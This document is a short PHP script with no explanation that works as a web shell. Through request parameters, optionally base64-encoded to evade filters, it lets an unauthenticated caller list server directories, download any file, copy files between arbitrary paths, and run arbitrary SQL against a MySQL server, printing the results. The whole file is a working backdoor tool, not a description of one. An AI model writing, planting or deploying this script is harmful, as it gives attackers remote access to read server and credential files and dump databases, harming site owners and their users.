<?php
header('Content-Type:text/html;charset=utf-8');

$action = @$_REQUEST["action"];
$dir = @$_REQUEST["dir"];
$filePath = @$_REQUEST["filepath"];
if($dir == ""){
	$dir = base64_decode(@$_REQUEST["bdir"]);
}
if($filePath == ""){
	$filePath = base64_decode(@$_REQUEST["bfilepath"]);
}


if($action=="list"){
	showDir($dir);
}else if($action=="down"){
	downFile($filePath);
}else if($action=="move"){
	$path1 = @$_REQUEST["path1"];
	if($path1 == ""){
		$path1 = base64_decode(@$_REQUEST["bpath1"]);
	}
	$path2 = @$_REQUEST["path2"];
	if($path2 == ""){
		$path2 = base64_decode(@$_REQUEST["bpath2"]);
	}
	copy($path1,$path2);
}else if($action=="mysql"){
	$host = @base64_decode($_REQUEST["host"]);
	$user = @base64_decode($_REQUEST["user"]);
	$pass = @base64_decode($_REQUEST["pass"]);
	$db = @base64_decode($_REQUEST["db"]);
	$sql = @base64_decode($_REQUEST["sql"]);
	$charset = @base64_decode($_REQUEST["charset"]);
	if($_REQUEST["charset"]==""){
		$charset = "utf8";
	}
	$link = mysql_connect($host, $user,$pass); 
	mysql_select_db($db, $link); 
	mysql_set_charset($charset); 

	$result=mysql_query($sql);
	$list=array();
	while ($entity = mysql_fetch_assoc($result)) {
		$list[] = $entity;
	}
	@mysql_free_result($result);
	print_r($list);
}


function showDir($directory){
	if(file_exists($directory)){
		if($dir_handle=@opendir($directory)){
			while($filename=readdir($dir_handle)){
				if($filename!="." && $filename!=".."){
					$subFile=$directory."/".$filename;
					echo basename($subFile)."\r\n";
					/*
					if(is_dir($subFile))
						showDir($subFile);
					if(is_file($subFile))
						echo basename($subFile);
					*/
				}
			}
		}
	}
}
function downFile($filePath){
	$file=fopen($filePath,"rb");
	Header("Content-type:application/octet-stream");
	Header("Accept-Ranges:bytes");
	Header("Accept-Length:".filesize($filePath));
	Header("Content-Disposition:attachment;filename=".$filePath);
	echo fread($file,filesize($filePath));	
	fclose($file);
	exit();
}

?>